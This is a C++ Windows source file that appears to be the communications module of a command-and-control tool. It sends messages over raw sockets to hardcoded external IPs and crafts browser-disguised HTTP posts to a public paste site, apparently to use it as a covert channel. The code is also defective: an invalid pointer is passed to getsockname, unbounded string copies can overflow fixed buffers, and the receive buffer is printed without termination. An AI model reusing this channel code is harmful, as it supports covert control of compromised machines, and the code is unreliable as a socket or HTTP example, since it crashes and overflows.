#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<ws2tcpip.h>
#include<string.h>

#ifndef C2_WINDOWS_H
#include "c2_windows.h"
#endif

windows_controller_communicator::windows_controller_communicator()
{
	chr_buff_1 = (char *)malloc(2000);
}

windows_controller_communicator::~windows_controller_communicator()
{
	free(chr_buff_1);
}

void windows_controller_communicator::send_message(char * message_to_send, char * ip_address, int port)
{
     WSADATA wsaData;
     SOCKET SendingSocket;

     // Server/receiver address
     SOCKADDR_IN ServerAddr, ThisSenderInfo;

     // Server/receiver port to connect to

     unsigned int Port = port;
     int  RetCode;

     // Be careful with the array bound, provide some checking mechanism...

     char * sendbuf = message_to_send;
     int BytesSent, nlen;

     // Initialize Winsock version 2.2

     WSAStartup(MAKEWORD(2,2), &wsaData);
     //printf("Client: Winsock DLL status is %s.\n", wsaData.szSystemStatus);

     // Create a new socket to make a client connection.
     // AF_INET = 2, The Internet Protocol version 4 (IPv4) address family, TCP protocol

     SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

     if(SendingSocket == INVALID_SOCKET)
     {

          //printf("Client: socket() failed! Error code: %ld\n", WSAGetLastError());

          // Do the clean up

          WSACleanup();

          // Exit with error

          //return -1;

     } 

 

     // Set up a SOCKADDR_IN structure that will be used to connect

     // to a listening server on port 5150. For demonstration

     // purposes, let's assume our server's IP address is 127.0.0.1 or localhost

 

     // IPv4
     ServerAddr.sin_family = AF_INET;

     // Port no.
     ServerAddr.sin_port = htons(Port);

     // The IP address
     ServerAddr.sin_addr.s_addr = inet_addr( ip_address );

 

     // Make a connection to the server with socket SendingSocket.
     RetCode = connect(SendingSocket, (SOCKADDR *) &ServerAddr, sizeof(ServerAddr));
     if(RetCode != 0)
     {

          //printf("Client: connect() failed! Error code: %ld\n", WSAGetLastError());

          // Close the socket

          closesocket(SendingSocket);

          // Do the clean up

          WSACleanup();

          // Exit with error

          //return -1;
     }
     else
     {
          //printf("Client: connect() is OK, got connected...\n");
          //printf("Client: Ready for sending and/or receiving data...\n");
     }

 

     // At this point you can start sending or receiving data on
     // the socket SendingSocket.

 

     // Some info on the receiver side...

     getsockname(SendingSocket, (SOCKADDR *)&ServerAddr, (int *)sizeof(ServerAddr));
     printf("Client: Receiver IP(s) used: %s\n", inet_ntoa(ServerAddr.sin_addr));
     printf("Client: Receiver port used: %d\n", htons(ServerAddr.sin_port));

 

     // Sends some data to server/receiver...
     BytesSent = send(SendingSocket, sendbuf, strlen(sendbuf), 0);

 

     if(BytesSent == SOCKET_ERROR)
     {
          //
     }
     else
     {

          //printf("Client: send() is OK - bytes sent: %ld\n", BytesSent);

          // Some info on this sender side...

          // Allocate the required resources

          memset(&ThisSenderInfo, 0, sizeof(ThisSenderInfo));

          nlen = sizeof(ThisSenderInfo);

          getsockname(SendingSocket, (SOCKADDR *)&ThisSenderInfo, &nlen);

          //printf("Client: Sender IP(s) used: %s\n", inet_ntoa(ThisSenderInfo.sin_addr));

          //printf("Client: Sender port used: %d\n", htons(ThisSenderInfo.sin_port));

          //printf("Client: Those bytes represent: \"%s\"\n", sendbuf);
     }

     char recvbuf[4096];

     int recv_result = recv(SendingSocket, recvbuf, sizeof(recvbuf), 0);

     printf("%s\n", recvbuf);

     shutdown(SendingSocket, SD_SEND);

     // When you are finished sending and receiving data on socket SendingSocket,
     // you should close the socket using the closesocket API. We will
     // describe socket closure later in the chapter.

     closesocket(SendingSocket);

     // When your application is finished handling the connection, call WSACleanup.

     WSACleanup();
}

char * windows_controller_communicator::post_to_pastebin(char * poster, char * content)
{

	char pastebin_request_header[1024];
	char pastebin_request_body[512];
	char pastebin_full_request[1600];
	char content_length_string[10];

	int content_length = 40;
	content_length += ( strlen(poster) + strlen(content) );
	
	strcpy(pastebin_request_header,"POST / HTTP/1.1\r\nHost: pastebin.ubuntu.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n");
	strcat(pastebin_request_header,"Content-Length: ");
	itoa(content_length,content_length_string,10);
	strcat(pastebin_request_header,content_length_string);
	strcat(pastebin_request_header,"\r\n");
	strcat(pastebin_request_header,"Connection: close\r\nReferer: https://pastebin.ubuntu.com/\r\nUpgrade-Insecure-Requests: 1");

	strcpy(pastebin_request_body,"poster=");
	strcat(pastebin_request_body,poster);
	strcat(pastebin_request_body,"&");

	strcat(pastebin_request_body,"syntax=text&expiration=&");

	strcat(pastebin_request_body,"content=");
	strcat(pastebin_request_body,content);

	strcpy(pastebin_full_request,pastebin_request_header);
	strcat(pastebin_full_request,"\r\n\r\n");
	strcat(pastebin_full_request,pastebin_request_body);
	strcat(pastebin_full_request,"\r\n");

	strcpy(chr_buff_1,pastebin_full_request);
	return chr_buff_1;

}


int main(int argc, char const *argv[])
{
	
     char * chr_buff = (char *)malloc( 1000 );
     char * chr_buff_2 = (char *)malloc( 100 );

    //35.180.186.70

     //strcpy(chr_buff,"GET / HTTP/1.1\r\nHost: fastconstructbarcelona.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\r\nAccept: */*\r\nConnection: close\r\n\r\n");
     //strcpy(chr_buff_2,"35.180.186.70");

     strcpy(chr_buff,"domnul_x");
     strcpy(chr_buff_2,"ba ce poola mea");

     windows_controller_communicator ws;
     //ws.send_message(chr_buff,chr_buff_2,80);
     char * chr_buff_3 = ws.post_to_pastebin(chr_buff,chr_buff_2);
     strcpy(chr_buff,"162.213.33.7");
     //ws.send_message(chr_buff_3,chr_buff,80);

     

}